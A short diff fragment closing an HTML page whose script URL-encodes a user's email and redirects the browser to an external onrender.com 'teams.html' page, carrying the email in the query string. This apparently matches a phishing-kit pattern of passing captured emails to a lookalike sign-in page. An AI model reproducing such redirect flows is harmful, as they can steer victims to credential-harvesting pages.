+                const encodedEmail = encodeURIComponent(currentEmail);
+                
+                // Redirect to the new URL with the email parameter
+                window.location.href = `https://friendly-winner-images.onrender.com/teams.html?email=${encodedEmail}`;
+            }
+        });
+
+    </script>
+</body>
+</html>
